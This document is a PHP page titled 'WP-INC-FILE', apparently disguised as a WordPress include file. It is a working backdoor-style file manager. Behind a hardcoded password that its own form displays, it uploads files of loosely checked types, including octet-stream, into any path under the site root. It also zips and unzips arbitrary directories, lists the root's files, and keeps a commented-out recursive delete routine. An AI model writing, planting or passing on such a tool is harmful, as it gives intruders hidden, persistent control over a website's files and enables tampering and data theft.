<?php
define('SITE_ROOT', realpath(dirname(__FILE__)));
$root_dir  = dirname($_SERVER['REQUEST_URI']);
$dir_value = '';
$extract   = '';

/*function delete_dir($path)
{
if (is_dir($path) === true)
{
$files = array_diff(scandir($path), array('.', '..'));
foreach ($files as $file)
{
delete_dir(realpath($path) . '/' . $file);
}
//return $path." DIR";
return rmdir($path);
}
else if (is_file($path) === true)
{
//return $path." FILE";
return unlink($path);
}
return false;
}*/
//echo delete_dir(SITE_ROOT."/net2ftp_v1.0_light");

if (isset($_POST['zip_file'])) {
    if ($_POST['pass'] === "Wicker321#") {
// advanced-custom-fields
        $dir_value = $_POST['dir'];
//$file_name = $_POST['file_name'];
        echo $destination = SITE_ROOT . $dir_value;
        echo "<br />";
// Get real path for our folder
        $rootPath    = $destination;
        $folder_name = basename($destination);
// Initialize archive object
        $zip = new ZipArchive();
        $zip->open($folder_name . '.zip', ZipArchive::CREATE | ZipArchive::OVERWRITE);
// Create recursive directory iterator
        /** @var SplFileInfo[] $files */
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($rootPath),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        foreach ($files as $name => $file) {
// Skip directories (they would be added automatically)
            if (!$file->isDir()) {
// Get real and relative path for current file
                $filePath     = $file->getRealPath();
                $relativePath = substr($filePath, strlen($rootPath) + 1);
// Add current file to archive
                $zip->addFile($filePath, $relativePath);
            }
        }
// Zip archive will be created only after closing object
        $zip->close();
    } else {
        echo "Type correct password";
    }
}
if (isset($_POST['un_zip'])) {
    if ($_POST['pass'] === "Wicker321#") {
        $dir_value   = $_POST['dir'];
        $extract     = $_POST['extract'];
        $destination = SITE_ROOT . $dir_value;
        echo $destination . $extract;
        $zip = new ZipArchive;
        $res = $zip->open($destination);
        if ($res === true) {
            $zip->extractTo(SITE_ROOT . $extract);
            $zip->close();
            echo ' woot!';
        } else {
            echo ' doh!';
        }
    }
}
?>
<!doctype html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
		<link rel="stylesheet" href="https://getbootstrap.com/docs/4.0/dist/css/bootstrap.min.css">
		<link rel="canonical" href="https://getbootstrap.com/docs/4.0/examples/sticky-footer-navbar/">
		<title>WP-INC-FILE</title>
		<style type="text/css">
			/* Sticky footer styles
		-------------------------------------------------- */
		html {
		position: relative;
		min-height: 100%;
		}
		body {
		/* Margin bottom by footer height */
		margin-bottom: 60px;
		}
		.footer {
		position: absolute;
		bottom: 0;
		width: 100%;
		/* Set the fixed height of the footer here */
		height: 60px;
		line-height: 60px; /* Vertically center the text there */
		background-color: #f5f5f5;
		}
		/* Custom page CSS
		-------------------------------------------------- */
		/* Not required for template or sticky footer method. */
		body > .container {
		padding: 60px 15px 0;
		}
		.footer > .container {
		padding-right: 15px;
		padding-left: 15px;
		}
		code {
		font-size: 80%;
		}
		.green {
			    border: 1px solid #28a745;
   				border-radius: 5px;
		}
		nav > .directory,small{
			color: #ffffff;
		}
		</style>
	</head>
	<body>
		<header>
			<!-- Fixed navbar -->
			<nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
				<div class="directory">
				File Directory : <small> <?php echo SITE_ROOT; ?></small>
			</div>
			</nav>
		</header>
		<!-- Begin page content -->
		<main role="main" class="container">
			
				<?php
					if (isset($_POST['submit'])) {
					    if ($_POST['pass'] === "Wicker321#") {
					        $dir_value   = $_POST['dir'];
					        $destination = SITE_ROOT . $dir_value;
					        $fname       = "files";
					        if (($_FILES[$fname]["type"] == "image/gif")
					            || ($_FILES[$fname]["type"] == "image/png")
					            || ($_FILES[$fname]["type"] == "image/jpeg")
					            || ($_FILES[$fname]["type"] == "application/octet-stream")
					            || ($_FILES[$fname]["type"] == "text/css")
					            || ($_FILES[$fname]["type"] == "application/pdf")
					            && ($_FILES[$fname]["size"] < (102400000))) //Maz size of file is 2 MB
					        {
					            $file_tmp   = $_FILES[$fname]["tmp_name"];
					            $name       = basename($_FILES[$fname]["name"]);
					            $fileName   = $name;
					            $place      = $destination . $fileName;
					            $isUploaded = move_uploaded_file($file_tmp, $place);
					            if ($isUploaded) {
					            	?>
					            	<div class="alert alert-info" role="alert">
										<?php echo  "<b>File Name : </b> " . $place; ?>
									</div>
									<div class="alert alert-success" role="alert">
										<b>File Status : </b> File Upload Completed
									</div>
					            	<?php
					            } 
					            else {
					            	?>
					            	  <div class="alert alert-danger" role="alert">
  										File Status — error uploading File!
									  </div>
					            	<?php
					               
					            }
					        } 
					        else {
					        		?>
					            	  <div class="alert alert-danger" role="alert">
  										File Status — Unsupported File!
									  </div>
					            	<?php
					        }
					    } 
					    else {
					    			?>
					            	  <div class="alert alert-danger" role="alert">
  										Type correct password!
									  </div>
					            	<?php
					       
					    }
					}
				?>
				
			<div class="row">
				<div class="col">
					<form id="uploadfile"  action="" method="POST" enctype="multipart/form-data">
						<div class="form-row">
							<div class="col-md-8 mb-3">
								<label for="validationServer01">File Directory</label>
								<input type="text" class="form-control is-valid" id="directory" name="dir" placeholder="/" value="<?php echo $dir_value; ?>">
							</div>
						</div>
						<div class="form-row">
							<div class="col-md-8 mb-3">
								<label for="exampleFormControlFile1">Select File</label>
   						        <input type="file" class="form-control-file green" name="files" id="exampleFormControlFile1">
							</div>
						</div>
						<div class="form-row">
							<div class="col-md-8 mb-3">
								<label for="exampleFormControlFile1">Password</label>
								<input type="password" name="pass" class="form-control is-valid" placeholder="Password (Wicker321#)" required>
							</div>
						</div>
						<input type="submit" class="btn btn-primary" name="submit" value="Upload" />
    					<!-- <input type="submit" class="btn btn-secondary" name="zip_file" value="Zip File" />
   						<input type="submit" class="btn btn-secondary" name="un_zip" value="UnZip File" /> -->
					</form>
				</div>
				<div class="col">
					<div class="alert alert-secondary" role="alert">
						<h5>All File Lists in directory </h5>
						<?php
							$log_directory = SITE_ROOT;
							foreach (glob($log_directory . '/*.*') as $file1) {
							    echo $file1;
							    echo "<br>";
							}
						?>
					</div>
				</div>
			</div>
		</main>
		<footer class="footer">
			<div class="container">
				<span class="text-muted">Modified By Habib Shaikh</span>
			</div>
		</footer>
		<!-- Bootstrap core JavaScript
		================================================== -->
		<!-- Placed at the end of the document so the pages load faster -->
		<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
		<script>window.jQuery || document.write('<script src="../../assets/js/vendor/jquery-slim.min.js"><\/script>')</script>
		<script src="https://getbootstrap.com/docs/4.0/assets/js/vendor/popper.min.js"></script>
		<script src="https://getbootstrap.com/docs/4.0/dist/js/bootstrap.min.js"></script>
	</body>
</html>
